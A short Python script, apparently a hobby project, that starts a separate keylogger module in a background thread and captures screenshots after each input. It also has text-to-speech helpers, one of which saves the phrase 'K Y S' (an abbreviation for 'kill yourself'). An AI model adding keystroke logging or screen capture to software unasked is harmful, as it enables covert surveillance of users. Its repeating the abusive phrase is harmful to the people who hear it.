import _thread, time, Keylogger, pygame, pyscreenshot
import os
from pygame import image
from tempfile import TemporaryFile

from gtts import gTTS

def printScreen():
    img = pyscreenshot.grab()
    img.show()

def timeTest(mod):
    ctr = 0
    while True:
        print (ctr)
        ctr+=mod
        time.sleep(1)

def tt():
    ctr = 0
    while True:
        print(ctr)
        ctr += 5
        time.sleep(1)

def play():
    pygame.mixer.init()
    pygame.mixer.music.load("Speech.mp3")
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        continue

def speak(x):
    text = gTTS(text= x, lang= 'en')
    with open("Speech.mp3", 'wb') as f:
        text.write_to_fp(f)
        f.close()
    play()
    delete()

def delete():
    time.sleep(2)
    pygame.mixer.music.load("Holder.mp3")
    os.remove("Speech.mp3")

def mainFunc():
    while True:
        choice = input()
        printScreen()

tts = gTTS(text='K Y S', lang='en')
tts.save("Holder.mp3")
_thread.start_new_thread(Keylogger.launchLogger, ())
_thread.start_new_thread(mainFunc, ())

while 1:
   pass